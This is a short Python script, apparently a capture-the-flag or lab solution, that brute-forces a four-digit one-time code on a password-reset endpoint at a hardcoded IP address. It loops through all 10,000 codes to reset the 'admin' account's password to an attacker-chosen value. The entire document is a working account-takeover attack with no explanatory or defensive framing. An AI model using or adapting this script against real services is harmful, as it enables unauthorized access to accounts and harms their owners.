import requests

url = 'http://103.185.44.122:7313/reset'
username = 'admin'
new_password = 'adminkitabersama'

for otp in range(10000):
    otp_str = str(otp).zfill(4)
    data = {
        'username': username,
        'otp': otp_str,
        'newpassword': new_password
    }
    response = requests.post(url, data=data)
    
    if "Invalid" not in response.text:
        print("OTP Found:", otp_str)
        print(response.text)
        break  # Exit loop if OTP is found
    else:
        if otp%1000==0:
            print(otp)

